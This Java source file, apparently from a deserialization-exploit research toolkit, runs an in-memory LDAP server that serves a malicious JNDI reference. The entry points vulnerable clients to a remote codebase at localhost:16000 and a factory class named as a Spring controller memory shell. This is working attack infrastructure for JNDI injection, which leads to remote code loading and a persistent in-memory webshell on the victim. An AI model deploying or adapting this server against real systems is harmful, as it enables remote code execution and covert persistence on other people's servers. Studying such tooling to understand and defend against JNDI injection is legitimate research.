package xyz.eki.marshalexp.tool;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;

import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPServer {

    public static void main ( String[] args ) {
        int port = 21389;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=eki,dc=xyz");
            //config.addAdditionalBindCredentials("uid=admin,ou=system", "secret");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.setSchema(null); // do not check (attribute) schema
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

            ds.startListening();
//            ds.add("dn: dc=eki,dc=xyz", "objectClass: top", "objectClass: domain", "dc: eki");
//            ds.add("dn: dc=javasec,dc=eki,dc=xyz", "objectClass: top", "objectClass: domain", "dc: staticsecurity");
//            ds.add("dn: cn=test,dc=javasec,dc=eki,dc=xyz", "objectClass: person", "sn: Tester", "givenName: Joe", "cn: test", "memberOf: cn=test,dc=javasec,dc=eki,dc=xyz");

            ds.add("dn:",
                    "ObjectClass: javaNamingReference",
                    "javaCodebase: http://localhost:16000/",
                    "JavaFactory: xyz.eki.marshalexp.memshell.MSpringController",
                    "javaClassName: whatever");

            System.out.println("Listening on 0.0.0.0:" + port);
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}
